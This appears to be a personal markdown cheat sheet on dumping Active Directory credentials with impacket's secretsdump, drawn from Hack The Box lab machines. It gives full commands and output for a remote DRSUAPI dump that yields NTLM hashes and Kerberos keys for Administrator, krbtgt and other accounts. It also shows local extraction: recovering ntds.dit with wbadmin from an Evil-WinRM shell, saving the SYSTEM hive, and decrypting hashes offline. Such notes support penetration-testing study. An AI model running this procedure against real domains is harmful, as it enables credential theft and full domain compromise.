# secretsdump
[impacket-secretsdump](https://github.com/toneillcodes/cybersecurity-notes/blob/main/windows/tools/impacket-tools.md#impacket-secretsdump)
## Remote
```
/usr/local/bin/secretsdump.py htb/john@10.129.240.61
```
```
$ /usr/local/bin/secretsdump.py htb/jorge@10.129.240.61
Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
john:10101:aad3b435b51404eeaad3b435b51404ee:44f077e27f6fef69e7bd834c7242b040:::
EXAMPLE$:1000:aad3b435b51404eeaad3b435b51404ee:01fa0da96b565c98c50508c7eecfd74d:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
...
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up... 
$ 
```

## Local
1. Obtain NTDIS.dit (somehow)
```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> echo "Y" | wbadmin start recovery -version:12/20/2024-09:01 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.

Retrieving volume information...
You have chosen to recover the file(s) c:\windows\ntds\ntds.dit from the
backup created on 12/20/2024 1:01 AM to C:\.
Preparing to recover files...

Do you want to continue?
[Y] Yes [N] No Y

Y
Successfully recovered c:\windows\ntds\ntds.dit to C:\.
The recovery operation completed.
Summary of the recovery operation:
--------------------

Recovery of c:\windows\ntds\ntds.dit to C:\ successfully completed.
Total bytes recovered: 18.00 MB
Total files recovered: 1
Total files failed: 0

Log of files successfully recovered:
C:\Windows\Logs\WindowsServerBackup\FileRestore-20-12-2024_09-10-49.log

*Evil-WinRM* PS C:\Users\svc_backup\Documents>
```

3. Obtain system.hive (somehow)
```
reg save HKLM\SYSTEM c:\system.hive
```
```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save HKLM\SYSTEM c:\system.hive
The operation completed successfully.

*Evil-WinRM* PS C:\Users\svc_backup\Documents>
```

3. Run secretsdump
```
secretsdump.py -ntds NTDS.dit -system system.hive LOCAL
```
```
$ secretsdump.py -ntds NTDS.dit -system system.hive LOCAL
Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from NTDS.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:2d83da304085f5d611c8f1ae837f67b3:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
...
SRV-EXCHANGE$:des-cbc-md5:f162aeb3da497aab
SRV-INTRANET$:aes256-cts-hmac-sha1-96:bc6ddf66d2027c2b9f4b921726d53032cad3e14efd5291c114f1ae76547be9a6
SRV-INTRANET$:aes128-cts-hmac-sha1-96:54416d5a7209a9bb741740834dddc7ad
SRV-INTRANET$:des-cbc-md5:4579ce9240895dae
[*] Cleaning up... 
$
```
